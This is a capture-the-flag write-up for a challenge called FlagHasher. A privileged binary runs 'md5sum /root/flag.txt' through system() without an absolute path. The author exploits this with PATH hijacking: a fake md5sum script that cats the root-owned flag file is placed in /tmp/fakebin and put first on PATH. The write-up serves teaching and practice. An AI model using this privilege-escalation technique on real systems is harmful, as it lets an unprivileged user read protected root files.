# Hash-only 1

**Challenge Name:** FlagHasher

**Category:** Binary Exploitation / Privilege Escalation

**Description:** We are given a binary `flaghasher` that has enough privileges to read `/root/flag.txt`. However, instead of printing the flag, it computes and outputs the **MD5 hash** of the file. The goal is to retrieve the actual flag instead of just its hash.

---

### Running the Binary

Executing the binary gives the following output:

```
$ ./flaghasher
Computing the MD5 hash of /root/flag.txt....
4d4f660d53535446f15c1a3a7b535e50  /root/flag.txt
```

This confirms that the binary:

- Has read access to `/root/flag.txt`
- Uses `md5sum` to compute the hash
- Uses `system()` to execute shell commands

We used `strings` to check for the file functions:

```
$ strings flaghasher
...
/bin/bash -c 'md5sum /root/flag.txt'
...
system
...
```

This confirms that `flaghasher` is executing `md5sum /root/flag.txt` via `system()`, meaning it might be vulnerable to **PATH hijacking**.

---

## 

Since `system()` executes commands without specifying absolute paths, we can create a **fake `md5sum`** script and manipulate `PATH` to trick the binary into running our script instead.

### **1. Create a Fake `md5sum` Script**

```
echo -e '#!/bin/bash\ncat /root/flag.txt' > md5sum
chmod +x md5sum
```

This script will simply **print the contents** of `/root/flag.txt` instead of computing the MD5 hash.

### **2. Create a Fake Binary Directory**

```
mkdir /tmp/fakebin
mv md5sum /tmp/fakebin/
```

Now, we have placed our fake `md5sum` inside a directory that we control.

### **3. Modify the `PATH` Variable**

```
export PATH="/tmp/fakebin:$PATH"
```

This ensures that when `flaghasher` runs `md5sum`, it will execute **our fake script** instead of the real one.

### **4. Run `flaghasher` Again**

```
./flaghasher
```

![image](https://github.com/user-attachments/assets/b0fa8102-a512-4570-8c0b-197436707092)
